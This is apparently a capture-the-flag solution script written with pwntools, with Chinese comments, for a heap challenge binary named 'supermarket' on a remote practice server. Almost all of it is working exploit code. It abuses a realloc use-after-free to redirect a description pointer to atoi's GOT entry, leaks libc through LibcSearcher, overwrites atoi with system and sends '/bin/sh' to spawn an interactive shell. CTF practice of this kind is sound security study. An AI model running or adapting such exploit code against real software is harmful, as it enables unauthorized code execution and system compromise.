from pwn import *  
from LibcSearcher import *  

context.log_level = 'DEBUG'

# sh = process('../file/supermarket')  
sh = remote('61.147.171.105', '53796')  
elf = context.binary = ELF('../file/supermarket')  
atoi_got = elf.got['atoi']  

input('continue?')

def create(index, size, content):  
    sh.sendlineafter(b'your choice>>', b'1')  
    sh.sendlineafter(b'name:', index)  
    sh.sendlineafter(b'price:', b'10')  
    sh.sendlineafter(b'descrip_size:', size)  
    sh.sendlineafter(b'description:', content)  

def delete(index):  
    sh.sendlineafter(b'your choice>>', b'2')  
    sh.sendlineafter(b'name:', index)  

def show():  
    sh.sendlineafter(b'your choice>>', b'3')  
  
def edit(index, size, content):  
    sh.sendlineafter(b'your choice>>', b'5')  
    sh.sendlineafter(b'name:', index)  
    sh.sendlineafter(b'descrip_size:', size)  
    sh.sendlineafter(b'description:', content)  

# """
# 攻防世界服务环境下的攻击方法
# 在本地测试无法成功，因为本地是libc 2.35的版本，加入了Tcache机制和safe linking技术，如何绕过有待研究
# """

#node0  
create(b'0', str(0x80).encode(), b'a'*0x10)

#node1，只用来做分隔作用，防止块合并  
create(b'1', str(0x20).encode(), b'b'*0x10)

#realloc node0->description  
#注意不要加任何数据，因为我们发送的数据写入到的是一个被free的块（仔细思考一下这句话），这会导致后面malloc时出错  
edit(b'0', str(0x90).encode(), b'')

#现在node2将被分配到node0的原description处  
create(b'2', str(0x20).encode(), b'd'*0x10)

#由于没有把realloc返回的指针赋值给node0->description，因此node0->description还是原来那个地址处，现在存的是node2  
#因此edit(0)就是编辑node2的结构体，我们通过修改，把node2->description指向atoi的got表 
payload = b'2'.ljust(16, b'\x00') + p32(20) + p32(0x20) + p32(atoi_got)
edit(b'0', str(0x80).encode(), payload)

#泄露信息  
show()
sh.recvuntil(b'2: price.20, des.')  
#泄露atoi的加载地址  
atoi_addr = u32(sh.recvuntil(b'\n').split(b'\n')[0].ljust(4, b'\x00'))  

libc = LibcSearcher('atoi', atoi_addr)
libc_base = atoi_addr - libc.dump('atoi')  
system_addr = libc_base + libc.dump('system')  

#修改atoi的表，将它指向system  
edit(b'2', str(0x20).encode(), p32(system_addr))  
#getshell
sh.sendlineafter(b'your choice>>', b'/bin/sh')  

sh.interactive()
